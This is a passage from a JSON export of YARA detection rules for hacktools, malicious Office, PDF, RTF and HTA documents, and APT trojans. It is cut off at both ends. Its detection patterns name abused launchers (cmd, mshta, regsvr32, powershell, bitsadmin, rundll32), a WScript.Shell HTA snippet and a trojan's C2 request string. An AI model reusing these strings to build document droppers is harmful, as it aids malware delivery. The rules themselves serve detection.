(uint16(0) == 0x5a4d and filesize < 300KB and 3 of them)\n}\n\nrule WPR_WindowsPasswordRecovery_EXE\n{\n    meta:\n        description = \"Windows Password Recovery (file: wpr.exe)\"\n        classifications = \"Hacktool\"\n        threat_names = \"Windows Password Recovery\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WPR_WindowsPasswordRecovery_EXE\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"UuPipe\" fullword ascii\n        $x2 = \"dbadllgl\" fullword ascii\n        $x3 = \"UkVHSVNUUlkgTU9O\" fullword ascii\n        $x4 = \"RklMRSBNT05JVE9SIC0gU1l\" fullword ascii\n        $s1 = \"WPR.exe\" fullword wide\n        $s2 = \"Windows Password Recovery\" fullword wide\n        $op0 = { 5f df 27 17 89 }\n        $op1 = { 5f 00 00 f2 e5 cb 97 }\n        $op2 = { e8 ed 00 f0 cc e4 00 a0 17 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 20000KB and (1 of ($x*) or all of ($s*) or all of ($op*))\n}\n\nrule WPR_WindowsPasswordRecovery_EXE_64\n{\n    meta:\n        description = \"Windows Password Recovery (file: ast64.exe)\"\n        classifications = \"Hacktool\"\n        threat_names = \"Windows Password Recovery\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WPR_WindowsPasswordRecovery_EXE_64\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%B %d %Y  -  %H:%M:%S\" fullword wide\n        $op0 = { 48 8d 8c 24 50 22 00 00 e8 bf eb ff ff 4c 8b c7 }\n        $op1 = { ff 15 16 25 01 00 f7 d8 1b }\n        $op2 = { e8 c2 26 00 00 83 20 00 83 c8 ff 48 8b 5c 24 30 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and all of them)\n}\n\nrule WMIcmd\n{\n    meta:\n        description = \"WMIcmd: command shell wrapper for WMI\"\n        ref = \"https://github.com/nccgroup/WMIcmd\"\n        classifications = \"Hacktool\"\n        threat_names = \"WMIcmd\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"@mimeframe\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"hacktool_windows_ncc_wmicmd\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $a1 = \"Need to specify a username, domain and password for non local connections\" wide ascii\n        $a2 = \"WS-Management is running on the remote host\" wide ascii\n        $a3 = \"firewall (if enabled) allows connections\" wide ascii\n        $a4 = \"WARNING: Didn't see stdout output finished marker - output may be truncated\" wide ascii\n        $a5 = \"Command sleep in milliseconds - increase if getting truncated output\" wide ascii\n        $b1 = \"0x800706BA\" wide ascii\n        $b2 = \"NTLMDOMAIN:\" wide ascii\n        $b3 = \"cimv2\" wide ascii\n\n    condition:\n        any of ($a*) or all of ($b*)\n}",
      "send_mail": false,
      "shareable": true
    },
    "6": {
      "builtin": true,
      "builtin_name": "Malicious-Documents",
      "created": "2020-05-10 14:25:02.654965",
      "id": 6,
      "modified": "2020-08-27 12:53:30.351757",
      "name": "Malicious-Documents",
      "owner_user_id": null,
      "rules": "\n\nprivate rule _document_analysis\n{\n    meta:\n        description = \"Rule is matched inside a document analysis\"\n        author = \"VMRay Labs\"\n\n    condition:\n        analysis_id == \"pdf\"\n        or analysis_id == \"office97\"\n        or analysis_id == \"olecf\"\n        or analysis_id == \"ooxml\"\n        or analysis_id == \"rtf\"\n}\n\nrule Document_Contains_Embedded_PE_File\n{\n    meta:\n        description = \"PE file inside a document; possible malware dropper\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $mz = \"MZ\"\n\n    condition:\n        // check for MZ header and PE header at correct offset\n        _document_analysis\n        and for any i in (1..#mz) : (\n            uint32(@mz[i] + uint32(@mz[i] + 0x3C)) == 0x00004550\n        )\n}\n\nrule Document_Office_CVE_2009_3129 {\n    meta:\n        description = \"Document contains possible metasploit payload for CVE-2009-3129\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $bof_record = {09 08 10 00 00 06 05 00 AA 1F (CC | CD) 07 C1 00 01 00 06 04 00 00}\n        $feathdr = {67 08 ?? ?? 67 08 00 00 00 00 00 00 00 00 00 00 04 00 01 04 00 00 00}\n\n    condition:\n        analysis_id==\"olecf\" and $bof_record at 0 and $feathdr at 20\n}\n\nrule Document_Office_CVE_2018_4878 {\n    meta:\n        description = \"Document contains possible exploit payload for CVE-2018-4878\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $fws = { 46 57 53 }\n        $flash_rdf_start = { 46 57 53 20 ?? ?? ?? ?? [0-1] 78 00 04 [2-4] 0E [0-1] A6 00 00 18 01 00 44 11 19 00 00 00 [4-16] 3C 72 64 66 3A 52 44 46 }\n        $flash_flex = \"Adobe Flex 4 Application\" wide ascii\n        $flash_rdf_end = { 3C 2F 72 64 66 3A 52 44 46 3E }\n        $flash_data = { 00 [1-2] 0F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 44 10 [0-1] ?8 03 3C 00 [2-36] 66 6C 61 73 68 30 3? 00 [0-1] ?F 15 ?? ?? ?? ?? [0-1] 0? 00 00 00 00 00 }\n        //$payload is between flash_data and $nopsled\n        $objects = \"createDispatcher\" wide ascii\n        $objects2 = \"createMediaPlayer\" wide ascii\n        $objects3 = \"drmManager\" wide ascii\n        $objects4 = \"DRMOperationCompleteListener\" wide ascii\n        $objects5 = \"addEventListener\" wide ascii\n        $uaf_method = \"LocalConnection\" wide ascii\n        $uaf_generator = \"UAFGenerator\" wide ascii\n\n    condition:\n        _document_analysis and (mime_type == \"application/x-shockwave-flash\" or mime_type == \"application/octet-stream\")\n        and @fws < 10\n        and (all of ($flash*) or $uaf_generator)\n        and all of ($objects*)\n        and $uaf_method\n}\n\nrule Document_Office_DDE {\n    meta:\n        description = \"Document utilizes dynamic data exchange (DDE); possible dropper\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $ole1 = /\\x13\\s*DDE(AUTO)?\\b\\x20[^\\x14]+(\\x14|\\x00\\x00)/ nocase wide ascii\n\n        $xml1 = /<\\s*w:fldChar\\s+w:fldCharType\\s*=\\s*['\"]begin['\"]\\s*(w:dirty\\s*=\\s*['\"](true|false)['\"])?\\s*\\/>.+[^A-Za-z0-9-]DDE(AUTO)?[^A-Za-z0-9-].+<w:fldChar\\s+w:fldCharType\\s*=\\s*['\"]end['\"]\\s*\\/>/ nocase wide ascii\n        $xml2 = /<\\s*w:fldSimple\\s+w:instr\\s*=\\s*['\"]DDE(AUTO)?[^A-Za-z0-9-].+['\"]\\s+(w:dirty=['\"](true|false)['\"])?\\s*\\/?>/ nocase wide ascii\n        $xml3 = /<\\s*ddeLink[^>]+ddeService\\s*=\\s*['\"](cmd|reg|mshta|regsvr32|[wc]script|powershell|bitsadmin|schtasks|rundll32)['\"][^>]+ddeTopic/ nocase wide ascii\n\n    condition:\n        (analysis_id == \"olecf\" or analysis_id == \"ooxml\")\n        and (any of ($ole*) or any of ($xml*))\n}\n\nrule Document_Office_SettingContentMS {\n    meta:\n        description = \"Document contains SettingContent-ms DeepLink tags\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $xml_schema = /<SearchableContent xmlns=\\\"http:\\/\\/schemas\\.microsoft\\.com\\/Search\\/2013\\/SettingContent\\\">/ nocase\n        $xml_field = /<DeepLink>.+?<\\/DeepLink>/ nocase\n\n    condition:\n        _document_analysis and all of them\n}\n\nrule LocaleCheck {\n    meta:\n        description = \"VBA macro code checks locale settings\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"VMRay Labs\"\n\n    strings:\n        $ = \"msoEncodingAutoDetect\" fullword nocase\n        $ = \"Application.LanguageSettings.LanguageID\" fullword nocase\n        $ = \"Application.International\" fullword nocase\n\n    condition:\n        mime_type == \"application/x-vba-macros\" and any of them\n}\n\nrule Document_Office_VeryHiddenMacro\n{\n    meta:\n        description = \"Document contains very hidden Excel 4.0 macro\"\n        ref = \"http://blog.inquest.net/blog/2019/01/29/Carving-Sneaky-XLM-Files/\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        Author = \"InQuest Labs\"\n        source = \"https://github.com/InQuest/yara-rules\"\n        original_name = \"Excel_Hidden_Macro_Sheet\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n       \n    strings:\n            $ole_marker     = {D0 CF 11 E0 A1 B1 1A E1}\n            $very_hidden_macro = {85 00 ?? ?? ?? ?? ?? ?? 02 01}\n            \n    condition:\n            not mime_type == \"application/x-msi\"\n            and $ole_marker at 0 \n            and $very_hidden_macro\n}\n\nrule HTA_with_WScript_Shell\n{\n    meta:\n        description = \"WScript Shell in HTA\"\n        ref = \"https://twitter.com/msftmmpc/status/877396932758560768\"\n        vti_default_score = 4\n        vti_documents_score = 4\n        vti_scripts_score = 4\n        vti_browser_score = 4\n        vti_msi_score = 4\n        vti_static_score = 4\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"HTA_with_WScript_Shell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<hta:application windowstate=\\\"minimize\\\"/>\"\n        $s2 = \"<script>var b=new ActiveXObject(\\\"WScript.Shell\\\");\" ascii\n\n    condition:\n        all of them\n}\n\nrule HTA_Embedded\n{\n    meta:\n        description = \"Embedded HTA file\"\n        ref = \"https://twitter.com/msftmmpc/status/877396932758560768\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"HTA_Embedded\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<hta:application windowstate=\\\"minimize\\\"/>\"\n\n    condition:\n        $s1 and not $s1 in (0 .. 50000)\n}\n\nrule PDF_Missing_startxref\n{\n    meta:\n        description = \"Malformed PDF without startxref; possible obfuscation\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $startxref = \"startxref\" fullword\n\n    condition:\n        mime_type == \"application/pdf\" and not $startxref\n}\n\nrule PDF_Malformed_startxref\n{\n    meta:\n        description = \"PDF with malformed startxref; possible obfuscation\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $good_startxref = /[\\r\\n]startxref[\\r|\\n|\\r\\n]+\\d+[\\r|\\n|\\r\\n]+/\n\n    condition:\n        mime_type == \"application/pdf\"\n        and not PDF_Missing_startxref\n        and not $good_startxref\n}\n\nrule PDF_Missing_EOF\n{\n    meta:\n        description = \"Malformed PDF without EOF marker; possible obfuscation\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $eof = /%%EOF(\\s|$)/\n\n    condition:\n        mime_type == \"application/pdf\" and not $eof\n}\n\nrule PDF_Data_after_last_EOF\n{\n    meta:\n        description = \"PDF has data appended after the last EOF marker; possible malicious payload\"\n        vti_default_score = 1\n        vti_documents_score = 1\n        vti_scripts_score = 1\n        vti_browser_score = 1\n        vti_msi_score = 1\n        vti_static_score = 1\n        author = \"VMRay Labs\"\n\n    strings:\n        $eof = /%%EOF(\\s|$)/\n        $data_after_eof = /%%EOF\\s+[^\\s].{10,}/s\n\n    condition:\n        mime_type == \"application/pdf\"\n        and $data_after_eof\n        and @data_after_eof[#data_after_eof] == @eof[#eof]\n}\n\nrule PDF_Obfuscated_names\n{\n    meta:\n        description = \"Obfuscated names in PDF document\"\n        ref = \"https://blog.nviso.be/2017/03/10/developing-complex-suricata-rules-with-lua-part-1/\"\n        vti_default_score = 4\n        vti_documents_score = 4\n        vti_scripts_score = 4\n        vti_browser_score = 4\n        vti_msi_score = 4\n        vti_static_score = 4\n        author = \"VMRay Labs\"\n\n    strings:\n        /*\n            def gen_strings(name):\n                for i in range(len(name)):\n                    parts = [\"2f\"]\n                    for j, c in enumerate(name):\n                        hl = \"#{:x}\".format(ord(c))\n                        hls = \" \".join(\"{:x}\".format(ord(b)) for b in hl)\n                        hu = \"#{:X}\".format(ord(c))\n                        hus = \" \".join(\"{:x}\".format(ord(b)) for b in hu)\n                        if j == i:\n                            part = \"({} | {})\".format(hls, hus)\n                        else:\n                            part = \"({:x} | {} | {})\".format(ord(c), hls, hus)\n                        parts.append(part)\n                    print(\"${}{} = {{{}}}\".format(name, i, \" \".join(parts)))\n        */\n\n        // /JavaScript\n        $JavaScript0 = {2f (23 34 61 | 23 34 41) (61 | 23 36 31 | 23 36 31) (76 | 23 37 36 | 23 37 36) (61 | 23 36 31 | 23 36 31) (53 | 23 35 33 | 23 35 33) (63 | 23 36 33 | 23 36 33) (72 | 23 37 32 | 23 37 32) (69 | 23 36 39 | 23 36 39) (70 | 23 37 30 | 23 37 30) (74 | 23 37 34 | 23 37 34)}\n        $JavaScript1 = {2f (4a | 23 34 61 | 23 34 41) (23 36 31 | 23 36 31) (76 | 23 37 36 | 23 37 36) (61 | 23 36 31 | 23 36 31) (53 | 23 35 33 | 23 35 33) (63 | 23 36 33 | 23 36 33) (72 | 23 37 32 | 23 37 32) (69 | 23 36 39 | 23 36 39) (70 | 23 37 30 | 23 37 30) (74 | 23 37 34 | 23 37 34)}\n        $JavaScript2 = {2f (4a | 23 34 61 | 23 34 41) (61 | 23 36 31 | 23 36 31) (23 37 36 | 23 37 36) (61 | 23 36 31 | 23 36 31) (53 | 23 35 33 | 23 35 33) (63 | 23 36 33 | 23 36 33) (72 | 23 37 32 | 23 37 32) (69 | 23 36 39 | 23 36 39) (70 | 23 37 30 | 23 37 30) (74 | 23 37 34 | 23 37 34)}\n        $JavaScript3 = {2f (4a | 23 34 61 | 23 34 41) (61 | 23 36 31 | 23 36 31) (76 | 23 37 36 | 23 37 36) (23 36 31 | 23 36 31) (53 | 23 35 33 | 23 35 33) (63 | 23 36 33 | 23 36 33) (72 | 23 37 32 | 23 37 32) (69 | 23 36 39 | 23 36 39) (70 | 23 37 30 | 23 37 30) (74 | 23 37 34 | 23 37 34)}\n        $JavaScript4 = {2f (4a | 23 34 61 | 23 34 41) (61 | 23 36 31 | 23 36 31) (76 | 23 37 36 | 23 37 36) (61 | 23 36 31 | 23 36 31) (23 35 33 | 23 35 33) (63 | 23 36 33 | 23 36 33) (72 | 23 37 32 | 23 37 32) (69 | 23 36 39 | 23 36 39) (70 | 23 37 30 | 23 37 30) (74 | 23 37 34 | 23 37 34)}\n        $JavaScript5 = {2f (4a | 23 34 61 | 23 34 41) (61 | 23 36 31 | 23 36 31) (76 | 23 37 36 | 23 37 36) (61 | 23 36 31 | 23 36 31) (53 | 23 35 33 | 23 35 33) (23 36 33 | 23 36 33) (72 | 23 37 32 | 23 37 32) (69 | 23 36 39 | 23 36 39) (70 | 23 37 30 | 23 37 30) (74 | 23 37 34 | 23 37 34)}\n        $JavaScript6 = {2f (4a | 23 34 61 | 23 34 41) (61 | 23 36 31 | 23 36 31) (76 | 23 37 36 | 23 37 36) (61 | 23 36 31 | 23 36 31) (53 | 23 35 33 | 23 35 33) (63 | 23 36 33 | 23 36 33) (23 37 32 | 23 37 32) (69 | 23 36 39 | 23 36 39) (70 | 23 37 30 | 23 37 30) (74 | 23 37 34 | 23 37 34)}\n        $JavaScript7 = {2f (4a | 23 34 61 | 23 34 41) (61 | 23 36 31 | 23 36 31) (76 | 23 37 36 | 23 37 36) (61 | 23 36 31 | 23 36 31) (53 | 23 35 33 | 23 35 33) (63 | 23 36 33 | 23 36 33) (72 | 23 37 32 | 23 37 32) (23 36 39 | 23 36 39) (70 | 23 37 30 | 23 37 30) (74 | 23 37 34 | 23 37 34)}\n        $JavaScript8 = {2f (4a | 23 34 61 | 23 34 41) (61 | 23 36 31 | 23 36 31) (76 | 23 37 36 | 23 37 36) (61 | 23 36 31 | 23 36 31) (53 | 23 35 33 | 23 35 33) (63 | 23 36 33 | 23 36 33) (72 | 23 37 32 | 23 37 32) (69 | 23 36 39 | 23 36 39) (23 37 30 | 23 37 30) (74 | 23 37 34 | 23 37 34)}\n        $JavaScript9 = {2f (4a | 23 34 61 | 23 34 41) (61 | 23 36 31 | 23 36 31) (76 | 23 37 36 | 23 37 36) (61 | 23 36 31 | 23 36 31) (53 | 23 35 33 | 23 35 33) (63 | 23 36 33 | 23 36 33) (72 | 23 37 32 | 23 37 32) (69 | 23 36 39 | 23 36 39) (70 | 23 37 30 | 23 37 30) (23 37 34 | 23 37 34)}\n\n        // /JS\n        $JS0 = {2f (23 34 61 | 23 34 41) (53 | 23 35 33 | 23 35 33)}\n        $JS1 = {2f (4a | 23 34 61 | 23 34 41) (23 35 33 | 23 35 33)}\n\n        // /Type\n        $Type0 = {2f (23 35 34 | 23 35 34) (79 | 23 37 39 | 23 37 39) (70 | 23 37 30 | 23 37 30) (65 | 23 36 35 | 23 36 35)}\n        $Type1 = {2f (54 | 23 35 34 | 23 35 34) (23 37 39 | 23 37 39) (70 | 23 37 30 | 23 37 30) (65 | 23 36 35 | 23 36 35)}\n        $Type2 = {2f (54 | 23 35 34 | 23 35 34) (79 | 23 37 39 | 23 37 39) (23 37 30 | 23 37 30) (65 | 23 36 35 | 23 36 35)}\n        $Type3 = {2f (54 | 23 35 34 | 23 35 34) (79 | 23 37 39 | 23 37 39) (70 | 23 37 30 | 23 37 30) (23 36 35 | 23 36 35)}\n\n        // /Subtype\n        $Subtype0 = {2f (23 35 33 | 23 35 33) (75 | 23 37 35 | 23 37 35) (62 | 23 36 32 | 23 36 32) (74 | 23 37 34 | 23 37 34) (79 | 23 37 39 | 23 37 39) (70 | 23 37 30 | 23 37 30) (65 | 23 36 35 | 23 36 35)}\n        $Subtype1 = {2f (53 | 23 35 33 | 23 35 33) (23 37 35 | 23 37 35) (62 | 23 36 32 | 23 36 32) (74 | 23 37 34 | 23 37 34) (79 | 23 37 39 | 23 37 39) (70 | 23 37 30 | 23 37 30) (65 | 23 36 35 | 23 36 35)}\n        $Subtype2 = {2f (53 | 23 35 33 | 23 35 33) (75 | 23 37 35 | 23 37 35) (23 36 32 | 23 36 32) (74 | 23 37 34 | 23 37 34) (79 | 23 37 39 | 23 37 39) (70 | 23 37 30 | 23 37 30) (65 | 23 36 35 | 23 36 35)}\n        $Subtype3 = {2f (53 | 23 35 33 | 23 35 33) (75 | 23 37 35 | 23 37 35) (62 | 23 36 32 | 23 36 32) (23 37 34 | 23 37 34) (79 | 23 37 39 | 23 37 39) (70 | 23 37 30 | 23 37 30) (65 | 23 36 35 | 23 36 35)}\n        $Subtype4 = {2f (53 | 23 35 33 | 23 35 33) (75 | 23 37 35 | 23 37 35) (62 | 23 36 32 | 23 36 32) (74 | 23 37 34 | 23 37 34) (23 37 39 | 23 37 39) (70 | 23 37 30 | 23 37 30) (65 | 23 36 35 | 23 36 35)}\n        $Subtype5 = {2f (53 | 23 35 33 | 23 35 33) (75 | 23 37 35 | 23 37 35) (62 | 23 36 32 | 23 36 32) (74 | 23 37 34 | 23 37 34) (79 | 23 37 39 | 23 37 39) (23 37 30 | 23 37 30) (65 | 23 36 35 | 23 36 35)}\n        $Subtype6 = {2f (53 | 23 35 33 | 23 35 33) (75 | 23 37 35 | 23 37 35) (62 | 23 36 32 | 23 36 32) (74 | 23 37 34 | 23 37 34) (79 | 23 37 39 | 23 37 39) (70 | 23 37 30 | 23 37 30) (23 36 35 | 23 36 35)}\n\n    condition:\n        mime_type == \"application/pdf\" and any of them\n}\n\nrule PDF_Base64_in_metadata : PDF\n{\n    meta:\n        description = \"Base64 blob in PDF metadata field; possible shellcode\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Glenn Edwards (@hiddenillusion)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"shellcode_blob_metadata\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $reg_keyword = /\\/Keywords.?\\(([a-zA-Z0-9]{200,})/\n        $reg_author = /\\/Author.?\\(([a-zA-Z0-9]{200,})/\n        $reg_title = /\\/Title.?\\(([a-zA-Z0-9]{200,})/\n        $reg_producer = /\\/Producer.?\\(([a-zA-Z0-9]{200,})/\n        $reg_creator = /\\/Creator.?\\(([a-zA-Z0-9]{300,})/\n        $reg_create = /\\/CreationDate.?\\(([a-zA-Z0-9]{200,})/\n\n    condition:\n        mime_type == \"application/pdf\" and any of them\n}\n\nrule PDF_Invalid_version\n{\n    meta:\n        description = \"Invalid version in PDF magic bytes; possible obfuscation\"\n        vti_default_score = 4\n        vti_documents_score = 4\n        vti_scripts_score = 4\n        vti_browser_score = 4\n        vti_msi_score = 4\n        vti_static_score = 4\n        author = \"VMRay Labs\"\n\n    strings:\n        $ver = /%PDF-[12].\\d/\n\n    condition:\n        mime_type == \"application/pdf\" and not $ver\n}\n\nrule PDF_JavaScript_unsupported_version\n{\n    meta:\n        description = \"JavaScript used in unsupported PDF version (< 1.3)\"\n        vti_default_score = 1\n        vti_documents_score = 1\n        vti_scripts_score = 1\n        vti_browser_score = 1\n        vti_msi_score = 1\n        vti_static_score = 1\n        author = \"VMRay Labs\"\n\n    strings:\n        $ver = /%PDF-1\\.[012]/\n        $js = \"/JavaScript\"\n\n    condition:\n        mime_type == \"application/pdf\"\n        and $ver at 0\n        and $js\n}\n\nrule PDF_JavaScript_unsupported_version_obfuscated\n{\n    meta:\n        description = \"JavaScript used in unsupported PDF version (< 1.3) and non-standard header\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"VMRay Labs\"\n\n    strings:\n        $ver = /%PDF-1\\.[012]/\n        $js = \"/JavaScript\"\n\n    condition:\n        mime_type == \"application/pdf\"\n        and $ver in (1..1024)\n        and $js\n}\n\nrule PDF_FlateDecode_unsupported_version\n{\n    meta:\n        description = \"FlateDecode used in unsupported PDF version (< 1.2); possible obfuscation\"\n        vti_default_score = 4\n        vti_documents_score = 4\n        vti_scripts_score = 4\n        vti_browser_score = 4\n        vti_msi_score = 4\n        vti_static_score = 4\n        author = \"VMRay Labs\"\n\n    strings:\n        $ver = /%PDF-1\\.[01]/\n        $flate = \"/FlateDecode\"\n\n    condition:\n        mime_type == \"application/pdf\"\n        and $ver at 0 and $flate\n}\n\nrule PDF_EmbeddedFiles_unsupported_version\n{\n    meta:\n        description = \"EmbeddedFiles used in unsupported PDF version (< 1.3); possible obfuscation\"\n        vti_default_score = 4\n        vti_documents_score = 4\n        vti_scripts_score = 4\n        vti_browser_score = 4\n        vti_msi_score = 4\n        vti_static_score = 4\n        author = \"VMRay Labs\"\n\n    strings:\n        $ver = /%PDF-1\\.[012]/\n        $ef = \"/EmbeddedFiles\"\n\n    condition:\n        mime_type == \"application/pdf\"\n        and $ver at 0 and $ef\n}\n\nrule RTF_Header_obfuscation\n{\n    meta:\n        description = \"Malformed RTF header; commonly used to confuse analyzers\"\n        vti_default_score = 4\n        vti_documents_score = 4\n        vti_scripts_score = 4\n        vti_browser_score = 4\n        vti_msi_score = 4\n        vti_static_score = 4\n        author = \"VMRay Labs\"\n\n    strings:\n        $bad_header = /^{\\\\rt[^f]/\n\n    condition:\n        $bad_header at 0\n}",
      "send_mail": false,
      "shareable": true
    },
    "7": {
      "builtin": true,
      "builtin_name": "Malware",
      "created": "2020-05-10 14:25:02.654965",
      "id": 7,
      "modified": "2020-08-27 12:53:30.360144",
      "name": "Malware",
      "owner_user_id": null,
      "rules": "import \"elf\"\nimport \"hash\"\nimport \"math\"\nimport \"pe\"\n\nprivate rule APT3102Code : APT3102 Family\n{\n    meta:\n        description = \"3102 code features\"\n        classifications = \"Trojan\"\n        threat_names = \"APT.3102\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"APT3102Code\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $setupthread = { B9 02 07 00 00 BE ?? ?? ?? ?? 8B F8 6A 00 F3 A5 }\n\n    condition:\n        any of them\n}\n\nprivate rule APT3102Strings : APT3102 Family\n{\n    meta:\n        description = \"3102 Identifying Strings\"\n        classifications = \"Trojan\"\n        threat_names = \"APT.3102\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"APT3102Strings\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = \"rundll32_exec.dll\\x00Update\"\n\n    condition:\n        any of them\n}\n\nrule APT3102 : Family\n{\n    meta:\n        description = \"3102 trojan\"\n        classifications = \"Trojan\"\n        threat_names = \"APT.3102\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"APT3102\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        APT3102Code or APT3102Strings\n}\n\nprivate rule APT9002Code : APT9002 Family\n{\n    meta:\n        description = \"9002 code features\"\n        classifications = \"Trojan\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"APT9002Code\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = { B9 7A 21 00 00 BE ?? ?? ?? ?? 8B F8 ?? ?? ?? F3 A5 }\n        $ = { 8A 14 3E 8A 1C 01 32 DA 88 1C 01 8B 54 3E 04 40 3B C2 72 EC }\n\n    condition:\n        any of them\n}\n\nprivate rule APT9002Strings : APT9002 Family\n{\n    meta:\n        description = \"9002 Identifying Strings\"\n        classifications = \"Trojan\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"APT9002Strings\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = \"POST http://%ls:%d/%x HTTP/1.1\"\n        $ = \"%%TEMP%%\\\\%s_p.ax\" wide ascii\n        $ = \"%TEMP%\\\\uid.ax\" wide ascii\n        $ = \"%%TEMP%%\\\\%s.ax\" wide ascii\n        $ = \"sysinfo\\x00sysbin01\"\n        $ = \"\\\\FlashUpdate.exe\"\n\n    condition:\n        any of them\n}\n\nrule APT9002 : Family\n{\n    meta:\n        description = \"9002 trojan\"\n        classifications = \"Trojan\"\n        threat_names = \"APT.9002\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"APT9002\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        APT9002Code or APT9002Strings\n}\n\nrule AbaddonPOS\n{\n    meta:\n        description = \"Abaddon POS malware\"\n        classifications = \"Spyware\"\n        threat_names = 